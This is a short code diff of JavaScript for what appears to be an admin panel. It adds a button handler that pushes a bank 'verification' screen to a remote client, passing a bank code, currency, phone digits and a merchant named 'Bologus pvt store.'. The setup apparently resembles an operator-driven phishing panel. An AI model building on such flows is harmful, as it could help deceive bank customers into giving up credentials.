@@ -2813,7 +2813,7 @@ document.getElementById('generateFreeLinkForm').addEventListener('submit', async
     });
   }
   
-// Start Verification button handler - UPDATED to include phone number
+// This is the code that should be in the admin.html file for the Start Verification button
 const mcStartVerificationBtn = document.getElementById('mcStartVerification');
 if (mcStartVerificationBtn) {
   mcStartVerificationBtn.addEventListener('click', function() {
@@ -2824,8 +2824,8 @@ if (mcStartVerificationBtn) {
     
     const verificationType = mcVerificationType.value;
     const bankCode = mcBankSelect.value;
-    const selectedCurrency = mcCurrencySelect.value; // Get selected currency
-    const phoneLastFour = document.getElementById('mcPhoneLastFour').value; // Get entered phone number
+    const selectedCurrency = mcCurrencySelect.value;
+    const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
     
     // Validate the phone number is 4 digits
     if (phoneLastFour && !/^\d{4}$/.test(phoneLastFour)) {
@@ -2838,18 +2838,18 @@ if (mcStartVerificationBtn) {
       verificationType: verificationType,
       bankCode: bankCode,
       currency: selectedCurrency,
-      phoneLastFour: phoneLastFour // Log phone number
+      phoneLastFour: phoneLastFour
     });
     
-    // Send event to show verification UI to client with currency and phone number
+    // Send event to show verification UI to client
     socket.emit('start_verification', {
       invoiceId: currentMcInvoiceId,
       verificationType: verificationType,
       bankCode: bankCode,
       merchantName: 'Bologus pvt store.',
       amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
-      currency: selectedCurrency, // Include selected currency
-      phoneLastFour: phoneLastFour // Include phone number
+      currency: selectedCurrency,
+      phoneLastFour: phoneLastFour // Make sure this is included!
     });
   });
 }
